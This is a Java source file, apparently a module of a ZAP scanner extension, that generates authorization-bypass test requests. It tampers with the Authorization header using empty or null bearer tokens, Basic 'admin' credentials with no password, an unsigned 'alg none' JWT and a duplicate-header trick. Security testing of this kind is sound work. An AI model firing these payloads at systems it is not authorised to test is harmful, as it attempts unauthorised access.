package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.List;
import java.util.function.BiConsumer;

public class AuthorizationTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "Authorization"; }
    @Override public int getOrder() { return 44; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        String[][] authzHeaders = {
            {"Authorization","Bearer "},{"Authorization","Bearer null"},
            {"Authorization","Bearer undefined"},{"Authorization","Bearer 0"},
            {"Authorization","Basic Og=="},{"Authorization","Basic OmFkbWlu"},
            {"Authorization","Basic YWRtaW46"},{"Authorization","Admin"},
            {"Authorization"," admin"},{"Authorization","null"},
            {"Authorization","Bearer eyJhbGciOiJub25lIn0.eyJpc3MiOiJhZG1pbiJ9."},
            {"Authorization","Bearer {}"},{"Authorization","Bearer []"},
            {"Authorization","Bearer <script>"},{"Authorization","Basic Og=="},
            {"Authorization","Digest username=admin"},
            {"Authorization","Negotiate"},{"Authorization","NTLM"},
            {"Authorization","ApiKey admin"},{"Authorization","Token admin"},
            {"Authorization","Low(admin)"},{"Authorization","HMAC admin"},
            {"Authorization","Signature admin"},{"Authorization","SSH admin"}
        };
        for (String[] pair : authzHeaders) {
            final String hv = pair[1];
            techs.add(new Technique("Authorization", "Authz:" + pair[1],
                "Authorization header tampering: " + pair[1],
                base -> { HttpMessage c = cloneMsg(base); addHeader(c, "Authorization", hv); return c; }));
        }
        techs.add(new Technique("Authorization", "AuthzDup:bearer",
            "Duplicate Authorization header (parser differential)",
            base -> {
                HttpMessage c = cloneMsg(base);
                c.getRequestHeader().addHeader("Authorization", "Bearer invalid");
                c.getRequestHeader().addHeader("Authorization", "Bearer admin");
                return c; }));
    }
}
